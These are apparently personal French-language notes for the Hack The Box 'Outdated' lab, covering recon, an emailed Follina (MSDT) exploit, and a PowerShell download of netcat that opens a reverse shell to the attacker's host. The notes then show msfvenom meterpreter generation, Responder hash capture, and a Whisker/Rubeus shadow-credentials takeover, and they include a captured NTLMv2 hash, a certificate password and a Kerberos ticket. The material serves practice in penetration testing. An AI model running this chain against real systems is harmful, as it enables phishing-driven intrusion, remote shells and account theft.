\chapter{Outdated}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC 10.10.11.175
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 06:42 CEST
Nmap scan report for 10.10.11.175
Host is up (0.10s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-08 11:42:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T11:44:19+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-08T11:44:20+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-10-08T11:44:19+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Not valid before: 2022-06-18T05:50:24
|_Not valid after:  2024-06-18T06:00:24
|_ssl-date: 2022-10-08T11:44:20+00:00; +7h00m00s from scanner time.
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-10-08T11:43:43
|_  start_date: N/A


$ sudo nmap -p- 10.10.11.175
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 07:43 CEST
Nmap scan report for dc.outdated.htb (10.10.11.175)
Host is up (0.040s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49688/tcp open  unknown
49911/tcp open  unknown
49921/tcp open  unknown
61811/tcp open  unknown
\end{verbatim}

\subsubsection{DNS}

\begin{verbatim}
$ dig @10.10.11.175 axfr outdated.htb

; <<>> DiG 9.18.7 <<>> @10.10.11.175 axfr outdated.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
\end{verbatim}

\begin{verbatim}
$ dig @10.10.11.175 any outdated.htb

; <<>> DiG 9.18.7 <<>> @10.10.11.175 any outdated.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3963
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 5

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;outdated.htb.                  IN      ANY

;; ANSWER SECTION:
outdated.htb.           600     IN      A       10.10.11.175
outdated.htb.           600     IN      A       172.16.20.1
outdated.htb.           3600    IN      NS      dc.outdated.htb.
outdated.htb.           3600    IN      SOA     dc.outdated.htb. hostmaster.outdated.htb. 225 900 600 86400 3600
outdated.htb.           600     IN      AAAA    dead:beef::ccc8:9743:1d47:a18b
outdated.htb.           600     IN      AAAA    dead:beef::22d
outdated.htb.           600     IN      AAAA    dead:beef::9562:9872:b4a6:c878

;; ADDITIONAL SECTION:
dc.outdated.htb.        1200    IN      A       172.16.20.1
dc.outdated.htb.        1200    IN      A       10.10.11.175
dc.outdated.htb.        1200    IN      AAAA    dead:beef::22d
dc.outdated.htb.        1200    IN      AAAA    dead:beef::9562:9872:b4a6:c878
\end{verbatim}

\subsubsection{SMB}

\begin{verbatim}
$ enum4linux-ng -A dc.outdated.htb


 ============================================
|    RPC Session Check on dc.outdated.htb    |
 ============================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'tidvbbbg', password ''
[H] Rerunning enumeration with user 'tidvbbbg' might give more results

[+] Domain SID: S-1-5-21-4089647348-67660539-4016542185
\end{verbatim}

\begin{verbatim}
$ enum4linux-ng -A 10.10.11.175 -u anonymous -p pass
 =========================================
|    Shares via RPC on dc.outdated.htb    |
 =========================================
[*] Enumerating shares
[+] Found 9 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
Shares:
  comment: ''
  type: Disk
UpdateServicesPackages:
  comment: A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
  type: Disk
WSUSTemp:
  comment: A network share used by Local Publishing from a Remote WSUS Console Instance.
  type: Disk
WsusContent:
  comment: A network share to be used by Local Publishing to place published content on this WSUS system.
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED
[*] Testing share Shares
[+] Mapping: OK, Listing: OK
[*] Testing share UpdateServicesPackages
[+] Mapping: OK, Listing: DENIED
[*] Testing share WSUSTemp
[+] Mapping: OK, Listing: DENIED
[*] Testing share WsusContent
[+] Mapping: OK, Listing: DENIED

\end{verbatim}

\begin{verbatim}
$ smbclient -U anonymous //10.10.11.175/shares
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 20 17:01:33 2022
  ..                                  D        0  Mon Jun 20 17:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 17:00:32 2022
\end{verbatim}


\begin{verbatim}
s we work to rebuild, please assist our NOC by e-mailing a link to any internal
web applications to itsupport@outdated.htb so we can get them added back into
our monitoring platform for alerts and notifications.

We have also onboarded a new employee to our SOC to assist

CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code
Execution Vulnerability.

CVE-2022-30138 Windows Print Spooler Elevation of Privilege Vulnerability.
CVE-2022-30129 Visual Studio Code Remote Code Execution Vulnerability.

CVE-2022-29130 Windows LDAP Remote Code Execution Vulnerability.
CVE-2022-29110 Microsoft Excel Remote Code Execution Vulnerability
\end{verbatim}

le point important est \verb+e-mailing a link to any internal web applications to itsupport@outdated.htb+

\url{https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/}

\subsubsection{smtp}

\begin{verbatim}
$ sudo nmap -p25 --script smtp-enum-users  10.10.11.175
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 11:08 CEST
Nmap scan report for dc.outdated.htb (10.10.11.175)
Host is up (0.026s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users:
|_  Couldn't perform user enumeration, authentication needed
\end{verbatim}

\begin{verbatim}
$ echo itsupport > users.txt
$ echo itsupport@outdated.htb > users.txt

$ smtp-user-enum -M RCPT -U users.txt -t 10.10.11.175 -D outdated.htb
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 3
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ outdated.htb

######## Scan started at Sun Oct  9 03:50:54 2022 #########
10.10.11.175: itsupport@outdated.htb exists
######## Scan completed at Sun Oct  9 03:50:55 2022 #########
1 results.

3 queries in 1 seconds (3.0 queries / sec)
\end{verbatim}

on ecrit un petit bout de programme qui envoie un mail avec l'url et un
\verb+nc+.

par contre il refuse de venir chercher ailleur que sur le port 80.
\begin{verbatim}
import smtplib

if __name__ == "__main__":

    sender = "macouille@follina.hack"
    receiver = "itsupport@outdated.htb"
    message = f"""From: {sender}
To: {receiver}
MIME-Version: 1.0
Content-type: text/html
Subject: open the door
http://10.10.16.3:80/index.html
"""
    server = smtplib.SMTP("mail.outdated.htb", 25, "outdated.htb")
    server.set_debuglevel(1)
    server.sendmail(sender, receiver, message)
    server.quit()
\end{verbatim}

\begin{verbatim}
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.175 - - [11/Oct/2022 08:41:02] "GET / HTTP/1.1" 200 -
\end{verbatim}

\subsubsection{follina}

on modifie le \url{https://github.com/JohnHammond/msdt-follina}{code follina de
John Hammond} pour ajouter le bout de code qui envoie le mail et venir pointer
sur l'ip pour le nc. On pourrait le modifier pour envoyer directement un
meterpreter.

On vire egalement le serveur http pour pouvoir le lancer à la mano et voir que
tout se passe bien
\begin{verbatim}
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.175 - - [11/Oct/2022 08:52:42] "GET / HTTP/1.1" 200 -
10.10.11.175 - - [11/Oct/2022 08:52:44] "GET /nc64.exe HTTP/1.1" 200 -
\end{verbatim}


\begin{verbatim}
$ python follina.py -r 4444 -p 80 -i tun0
[+] serve host 10.10.16.3
[+] serve host 10.10.16.3
[+] copied staging doc /tmp/x965q_ol
[+] create serve path /tmp/x965q_ol/www
[+] created maldoc ./follina.doc
[+] command Invoke-WebRequest http://10.10.16.3:80/nc64.exe -OutFile C:\Windows\Tasks\nc.exe; C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.16.3 4444
[+] serving html payload on :80
[+] email {MOC_url}
[+] mail From: macouille@follina.hack
To: itsupport@outdated.htb
MIME-Version: 1.0
Content-type: text/html
Subject: http://10.10.16.3:80/index.html
http://10.10.16.3:80/index.html

send: 'ehlo outdated.htb\r\n'
reply: b'250-mail.outdated.htb\r\n'
reply: b'250-SIZE 20480000\r\n'
reply: b'250-AUTH LOGIN\r\n'
reply: b'250 HELP\r\n'
reply: retcode (250); Msg: b'mail.outdated.htb\nSIZE 20480000\nAUTH LOGIN\nHELP'
send: 'mail FROM:<macouille@follina.hack> size=177\r\n'
reply: b'250 OK\r\n'
reply: retcode (250); Msg: b'OK'
send: 'rcpt TO:<itsupport@outdated.htb>\r\n'
reply: b'250 OK\r\n'
reply: retcode (250); Msg: b'OK'
send: 'data\r\n'
reply: b'354 OK, send.\r\n'
reply: retcode (354); Msg: b'OK, send.'
data: (354, b'OK, send.')
send: b'From: macouille@follina.hack\r\nTo: itsupport@outdated.htb\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\nSubject: http://10.10.16.3:80/index.html\r\nhttp://10.10.16.3:80/index.html\r\n.\r\n'
reply: b'250 Queued (10.532 seconds)\r\n'
reply: retcode (250); Msg: b'Queued (10.532 seconds)'
data: (250, b'Queued (10.532 seconds)')
send: 'quit\r\n'
reply: b'221 goodbye\r\n'
reply: retcode (221); Msg: b'goodbye'
[+] starting 'nc -lvnp 4444'
Listening on 0.0.0.0 4444
Connection received on 10.10.11.175 49809
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\btables\AppData\Local\Temp\SDIAG_ddacd992-2c59-44ec-a01b-1b46a39183a1>
\end{verbatim}

bon pas stable du tout l'analyseur de mail pour l'appel de l'url de base.

\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
$ swaks --to itsupport@outdated.htb --from meow@meow --server mail.outdated.htb --body "http://10.10.16.3/"

$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=5555 -f exe > meter.exe

PS C:\Users\btables\Desktop> Invoke-WebRequest -Uri http://10.10.16.3/meter.exe -OutFile meter.exe
C:\Users\btables\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID
================ ============================================
outdated\btables S-1-5-21-4089647348-67660539-4016542185-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ==================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
OUTDATED\ITStaff                           Group            S-1-5-21-4089647348-67660539-4016542185-1107 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
\end{verbatim}

\begin{verbatim}
$ sudo responder -I tun0
C:\Users\btables\Desktop>dir \\10.10.16.3\toto

SMB] NTLMv2-SSP Client   : 10.10.11.175
[SMB] NTLMv2-SSP Username : OUTDATED\btables
[SMB] NTLMv2-SSP Hash     : btables::OUTDATED:aede1ef048eac382:640A1FAA8C3E636321ED1FE0456C2190:01010000000000008044B786E0DDD8017652FAEF313F7AAA0000000002000800490054003900390001001E00570049004E002D0052004300580034005200470038003500590038004B0004003400570049004E002D0052004300580034005200470038003500590038004B002E0049005400390039002E004C004F00430041004C000300140049005400390039002E004C004F00430041004C000500140049005400390039002E004C004F00430041004C00070008008044B786E0DDD80106000400020000000800300030000000000000000000000000200000E0A850D31074F0AC37A2D88F2080C1B75BFFB5B22BD91A273EDCCC081D02E6F00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
\end{verbatim}
dommage pas crackable

\begin{verbatim}
[*] 10.10.11.175 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 21H1 build detected!
 7   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
\end{verbatim}
ils ne passent pas

\begin{verbatim}
PS C:\Users\btables\Desktop> Get-ComputerInfo

\end{verbatim}

avec bloodhound
\begin{verbatim}
The members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the
"msds-KeyCredentialLink" property on SFLOWERS@OUTDATED.HTB. Writing to this
property allows an attacker to create "Shadow Credentials" on the object and
authenticate as the principal using kerberos PKINIT.

The user SFLOWERS@OUTDATED.HTB has the capability to create a PSRemote
Connection with the computer DC.OUTDATED.HTB.
\end{verbatim}

on a plusieurs solution pour whisker. Soit on prend le code source et on le
compile soit on peut prendre un script powershell ici
\url{https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries}

\begin{verbatim}
PS C:\Users\btables\Desktop> . Invoke-Whisker
PS C:\Users\btables\Desktop> gci -Path Function:\Invoke-Whisker
gci -Path Function:\Invoke-Whisker

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-Whisker

PS C:\Users\btables\Desktop> Invoke-Whisker
Invoke-Whisker

Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their
msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the target account.

C:\Users\btables\Desktop>.\whisker add /target:SFLOWERS /dc:10.10.11.175
.\whisker add /target:SFLOWERS /dc:10.10.11.175
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password ORzbqu1VzP82H5G8
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 0065bd86-512e-4ec0-8760-3217bcbed1af
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:SFLOWERS /certificate:MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaCCCV0EgglZMIIJVTCCBg4GCSqGSIb3DQEHAaCCBf8EggX7MIIF9zCCBfMGCyqGSIb3DQEMCgECoIIE9jCCBPIwHAYKKoZIhvcNAQwBAzAOBAgQMzrCocULnwICB9AEggTQiENssH6ZOTTAKgBEEmVMjmgEC03AOaeb2Gyoij44kvXuFYIVYEkJSeJc2vEIJDOrBP0tflr0gb7qQSIH+8FTS4uP6+XlDUHD11APdX2pYOzF3oE45vmEA0S6QJT3ys7FPzNGVRBg+jCUqntglLM6YDI/UHyOeaA2CKPZmK7AFvvwYorWnIRhAdPwc726/hOBYr5/A5clW7V+kxPKDsRiOBky1xbAfIhtE5KbOw2N6PUgGnGLrlVmM6bYHnnj71ASYHdbG6yHACkjVnVxqjlbBOjlZhgWaiXjY4GB1TwGsuWKqSrsGgIVaKnXP+TDjtW86eu6JJcgPAFjAPlSHypRoplFouLZ9jrAeH/6NO6jYME/1rLxiYOmcyK/RvbKRf/0AQV1GtnAnuEECZ5URVA+y2gBsk8Nb63mCkJCj4/+7qtYskGRQR4gLOpGNan6G+nN0Qh3n80eu2UOApAWqRLjyRvTzuBPQnkcNatGbspv3SVb/zj5fIDvq0LXLcl9CtHMp+W2W+5KrONpe/9Y0cEbbtb0CzJi+YAabmHryx7t4XGi7NU0S7+60xAP6Go6cXFhJGu1AC7RbI06QUJyEdqYJC7VGAcBdhA672P8lJwOn858alPno7pv7j4dMAG+u0sc/lRnU4AY9igFbj9emLTOVDbN6JEq2iKWVq685rx5toKDuq+QN6LDNfy4LygFXLa2UaoJSc02tQFJEQC8dljY1897UDxE/IGwz3YfyGGBTss8TZ8dIvh4cVmNmzRlvO6vriDNoJ5rLmDEr2rS/MY5aGRLmay92hIOaDmx3tVzzFijrgd9gnAPmLtMtX1PGIMwUF3zUCCIZ311+ln4EQNt2YdFVzqVhPxsYsnolWmkaknlXF48EgjCY1J0iHqXszK7DSzCRW3qtlaGtdhu2LjiBCexlNwF6e18uveOFnxb1y/jTZSuXvwEWzvBpdnTrBqgMZtiu7spIM4FAviQRloyYgYRJNGgmvhoY/IQQPS8azL/X6TONHB57gYvKUwYt/o0CKCB1vKs+kwnkDyVY/NPry038Yxa1A+MICQzeD2zzFQ1wA/w8MgZWgO0usduldVA9pZq/EyNAYkHAOjGkiWkajSe8+hZgeBVTizrBygtuiJXVltKN6E0dfFzpYwLBFpp7Jw9HR56Ti/f/v7Mybh1LfuKGtmB5S6x07NUUCwLYAQwU1ymbMng7RUEwfontUO1N9VLeFnSR8qLZUOu5mwb4YfIcyXkCXZJ/APY8jUt0CEwUlJDR7Uj8TGKypwycopH5YFRHtCN210HE9S6N69SLOv7GQB0+UTPBw1VMXWXBqsUzg8mkVMNNuNr1xPVCZvYQ7rdZCBjlunzJRgEhq1+JxL1or7md5xqSxvPy3QtbsxQTfVHoRbxuNx39fIS4qfgWshrjjMa04s4LQp/kfTFqBl8ux8QjDFrusppjYgxgz162xIglQ1hpB2/fwqoC6UmN+KYVPnR7yp9RLlI2lrIQ3tHDf7kmREvwgS+SPXG+PXtCS7+9k6K4rz7EpQ7jDfT6kWpJlyqpuRaN9w0D7DDXvA4LsR0P8wBD8yWVkCu+Cx/dn0TjQ+GEYekHErzBne8koN9jrK58HrZF1A1WZQ47eZhLngFt+urlklTtd42xTYxgekwEwYJKoZIhvcNAQkVMQYEBAEAAAAwVwYJKoZIhvcNAQkUMUoeSAA2AGEAYQAyADQANgAxADIALQAwAGEANAA2AC0ANABlADcANgAtAGIAOAAwAGYALQA3ADQAZABjADUAMgBkADAANABjADcAMDB5BgkrBgEEAYI3EQExbB5qAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAAUgBTAEEAIABhAG4AZAAgAEEARQBTACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcjCCAz8GCSqGSIb3DQEHBqCCAzAwggMsAgEAMIIDJQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIRT6+P0x5Tx8CAgfQgIIC+CLvjvcgd3qtBqTdpG+Vfuq/9/8F61oIvC2VBKe8Rn6jYi16QLp0Y7qsnQrUTT+nrBvmQGRRYjEgmFXbAEQebOSNZHsK15iEnC00EZPLic1+tt9kdxmDFGjAoOjsg3HY+563whsW+Mgq1M/wOcyeEurziLHIfYQBRPOhkzblMiiuX+i6UmOhI1xwJr+zmOxP16kOFZBZm6HyvGoyfrTKrgkZwucXdVkK8gWkYbtlWmqKQN6of6mEz+oFZufOYFSiX1xJnBGc3dxwLlFdGmHcziPoAgjMdqJkdiRFSCP0JJJ1Ib4ipJnfydlYkk5JrxX74pzWjIFGNtkJKIAI+rFjn/ESYF5RuDSh5ojOLCnRFZPFmpSARpHoJGQuQkDnS3gIR2uZ60ptaBKMZa+827/fx23jlur+rm81N8ySTd42yfjM/KJsTa7NS3mDtQ2runsfT/QVAYU/TA8jULL+PCgrT5UrI/FHPynnhmqt5HtYBBkcASmvEJQYmZhCpB1ZFSawmMpPdnXOxRwjUJFu6j45ECaZ+WOaPo4qgepxHbQU6noUXSR220ctzf9FDuDwjoJQYc/h3SFb6CPaHUJWS8qaiN58kN5KX02OpGQwW+ID++dn4foYu4/WZPqNpMDpXIv/do1aA9jr0r35UE5LtiZOYoCxO9RjDwrgm8SjsJ1fLxka66ANcuNYIEp/Sd7K8TUVkwuhmKDKWngR1TrPGjN9Tsk+lk7kwoMgfvn22Z6oPVkNFmsRMDf2FVAWq42Zz+poVH/OqlxhTvIQuRpwFo0BgmYar6HKr3rLbQw0dDhJegylINeeV/TUf9kQ6NZUbpV8A9Dwc65Pa5RDXB6ZfyfOa2MJxTH21c/zLIu5g1uTpNK7vEuAyMNKMomvsQNufD5yBoYP+3GOt7pAtsWRZ6lV8W1befRCno8NMSBwudS8rulxnByqkcwNuBZhmeFWcfKx/U4P/cZ+8Da74j/ZQMM3LE35jnTTheAIhy3ldUnXbpV7OxlTEDX2luEwOzAfMAcGBSsOAwIaBBSXn/Sg7/ATzayX4HBjAwtKrtL6TQQUGooe5BYXvyp9YGQRXtxTJQdYBx0CAgfQ /password:"ORzbqu1VzP82H5G8" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
\end{verbatim}
\begin{verbatim}

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=SFLOWERS
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\SFLOWERS'
[*] Using domain controller: 10.10.11.175:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
